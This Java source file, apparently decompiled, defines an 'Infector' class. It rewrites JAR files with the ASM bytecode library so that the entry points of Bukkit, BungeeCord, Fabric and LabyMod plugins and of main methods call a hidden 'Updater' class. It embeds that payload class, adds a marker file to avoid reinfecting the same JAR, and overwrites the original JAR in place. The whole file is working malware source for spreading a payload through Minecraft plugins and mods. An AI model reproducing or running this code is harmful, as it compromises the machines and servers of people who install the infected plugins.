import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.tree.ClassNode;
import org.objectweb.asm.tree.MethodInsnNode;
import org.objectweb.asm.tree.MethodNode;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.StandardCopyOption;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class Infector {
    public HashMap<String, ClassNode> mainClassesInfected = new HashMap<>();
    public HashMap<String, byte[]> files = new HashMap<>();

    public void infect(File file, byte[] byArray) {
        File file2 = new File(file.getPath() + ".tmp");
        try {
            System.out.println("Loading jar file: " + file.getPath());
            if (this.searchAndInfect(file)) {
                System.out.println("Write jar file: " + file2.getPath());
                this.writeFile(file2, byArray);
                System.out.println("Copy jar file: " + file2.getPath() + " to " + file.getPath());
                Files.copy(file2.toPath(), file.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
            }
            this.mainClassesInfected.clear();
            this.files.clear();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        file2.delete();
    }

    public boolean putUpdaterInit(ClassNode classNode) {
        MethodNode methodNode = null;
        MethodNode methodNode2 = null;
        boolean bl = classNode.superName.equals("net/labymod/api/LabyModAddon");
        boolean bl2 = classNode.interfaces != null && classNode.interfaces.contains("net/fabricmc/api/ClientModInitializer");
        boolean bl3 = classNode.superName.equals("net/md_5/bungee/api/plugin/Plugin");
        boolean bl4 = classNode.superName.equals("org/bukkit/plugin/java/JavaPlugin");
        boolean bl5 = false;
        for (MethodNode methodNode3 : classNode.methods) {
            if (methodNode3.desc.equals("()V")) {
                if (bl) {
                    if (!methodNode3.name.equals("onEnable")) continue;
                    methodNode3.instructions.insertBefore(methodNode3.instructions.get(0), new MethodInsnNode(184, "Updater", "init", "()V"));
                    bl5 = true;
                    continue;
                }
                if (bl2) {
                    if (!methodNode3.name.equals("onInitializeClient")) continue;
                    methodNode3.instructions.insertBefore(methodNode3.instructions.get(0), new MethodInsnNode(184, "Updater", "init", "()V"));
                    bl5 = true;
                    continue;
                }
                if (!bl3 && !bl4) continue;
                if (methodNode3.name.equals("onLoad")) {
                    methodNode = methodNode3;
                    continue;
                }
                if (!methodNode3.name.equals("onEnable")) continue;
                methodNode2 = methodNode3;
                continue;
            }
            if ((methodNode3.access & 8) == 0 || !methodNode3.name.equals("main") || !methodNode3.desc.equals("([Ljava/lang/String;)V")) continue;
            methodNode3.instructions.insertBefore(methodNode3.instructions.get(0), new MethodInsnNode(184, "Updater", "init", "()V"));
            bl5 = true;
        }
        if (bl4 || bl3) {
            if (methodNode != null) {
                methodNode.instructions.insertBefore(methodNode.instructions.get(0), new MethodInsnNode(184, "Updater", "init", "()V"));
                bl5 = true;
            } else if (methodNode2 != null) {
                methodNode2.instructions.insertBefore(methodNode2.instructions.get(0), new MethodInsnNode(184, "Updater", "init", "()V"));
                bl5 = true;
            }
        }
        return bl5;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean searchAndInfect(File file) {
        boolean bl = false;
        try (JarFile jarFile = new JarFile(file);){
            Enumeration enumeration = jarFile.entries();
            while (enumeration.hasMoreElements()) {
                JarEntry jarEntry = (JarEntry)enumeration.nextElement();
                if (jarEntry.getName().equals("plugin-config.bin")) {
                    boolean bl2 = false;
                    return bl2;
                }
                byte[] byArray = this.readInputStreamToByteArray(jarFile.getInputStream(jarEntry));
                if (jarEntry.getName().endsWith(".class")) {
                    try {
                        ClassNode classNode = this.loadClassNodeFromByteArray(byArray);
                        if (this.putUpdaterInit(classNode)) {
                            bl = true;
                            this.mainClassesInfected.put(jarEntry.getName(), classNode);
                            continue;
                        }
                        this.files.put(jarEntry.getName(), byArray);
                    }
                    catch (Exception exception) {
                        this.files.put(jarEntry.getName(), this.readInputStreamToByteArray(jarFile.getInputStream(jarEntry)));
                    }
                    continue;
                }
                this.files.put(jarEntry.getName(), byArray);
            }
            return bl;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return false;
        }
    }

    public void writeFile(final File file, final byte[] key) throws IOException {
        file.createNewFile();
        final OutputStream outputStream = Files.newOutputStream(file.toPath(), new OpenOption[0]);
        final JarOutputStream jarOutputStream = new JarOutputStream(outputStream);
        this.files.forEach((name, contents) -> {
            final JarEntry jarEntry = new JarEntry(name);
            try {
                jarOutputStream.putNextEntry(jarEntry);
                jarOutputStream.write(contents);
                jarOutputStream.closeEntry();
            }
            catch (Exception ex) {
                System.err.println(name);
                ex.printStackTrace();
            }
        });
        this.mainClassesInfected.forEach((className, classNode) -> {
            byte[] array;
            try {
                array = this.writeClass(classNode, 3);
            }
            catch (Exception ex3) {
                try {
                    array = this.writeClass(classNode, 2);
                }
                catch (Exception ex4) {
                    try {
                        array = this.writeClass(classNode, 1);
                    }
                    catch (Exception ex5) {
                        try {
                            array = this.writeClass(classNode, 0);
                        }
                        catch (Exception ex) {
                            System.err.println(classNode.name + " e3");
                            ex.printStackTrace();
                            return;
                        }
                    }
                }
            }
            try {
                jarOutputStream.putNextEntry(new JarEntry(className));
                jarOutputStream.write(array);
                jarOutputStream.closeEntry();
            }
            catch (IOException ex2) {
                System.err.println(className + " ioe");
                ex2.printStackTrace();
            }
        });
        jarOutputStream.putNextEntry(new JarEntry("Updater.class"));
        jarOutputStream.write(this.readInputStreamToByteArray(Infector.class.getResourceAsStream("/updater")));
        jarOutputStream.closeEntry();
        jarOutputStream.putNextEntry(new JarEntry("plugin-config.bin"));
        jarOutputStream.write(key);
        jarOutputStream.closeEntry();
        jarOutputStream.close();
        try {
            outputStream.close();
        }
        catch (Exception ex) {
            System.err.println("lol");
            ex.printStackTrace();
        }
        System.out.println("finished!");
    }

    public byte[] writeClass(ClassNode classNode, int flags) throws Exception {
        ClassWriter classWriter = new ClassWriter(flags);
        classNode.accept(classWriter);
        return classWriter.toByteArray();
    }

    public byte[] readInputStreamToByteArray(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] byArray = new byte[65535];
        int n = inputStream.read(byArray);
        while (n != -1) {
            byteArrayOutputStream.write(byArray, 0, n);
            n = inputStream.read(byArray);
        }
        return byteArrayOutputStream.toByteArray();
    }

    public ClassNode loadClassNodeFromByteArray(byte[] byArray) {
        ClassReader classReader = new ClassReader(byArray);
        ClassNode classNode = new ClassNode();
        classReader.accept(classNode, 0);
        return classNode;
    }
}